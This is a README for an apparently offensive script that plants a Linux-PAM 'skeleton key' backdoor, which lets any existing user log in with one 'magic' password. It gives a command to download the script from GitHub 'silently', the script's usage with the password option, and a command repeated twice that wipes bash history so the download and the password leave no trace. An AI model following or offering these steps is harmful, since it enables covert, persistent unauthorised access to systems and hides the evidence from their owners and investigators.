# Linux Skeleton Key              
This script automates the creation of a backdoor for Linux-PAM (Pluggable Authentication Modules). This is also known as a skeleton key.

## Usage
Download the tool silently:
```sh
curl -O https://raw.githubusercontent.com/her3ticAVI/linux-pam-backdoor/master/.backdoor.sh
cat /dev/null > ~/.bash_history && history -c && exit
```

The following banner shows the help menu:
```sh
sudo ./backdoor.sh --help
Usage: ./backdoor.sh [-v version] -p password [--restore] [--verbose]
Options:
  -v           Specify Linux-PAM version.
  -p           The 'magic' password for the backdoor.
  --restore    Restore original PAM from backup.
  --verbose    Show all command output.
```
After that reboot your system and you can login to the system using an existing user, and the previously configured password.
Make sure to clear bash history so others can't see the skeleton key password:
```sh
cat /dev/null > ~/.bash_history && history -c && exit
```

## Resources
- https://attack.mitre.org/software/S0007/
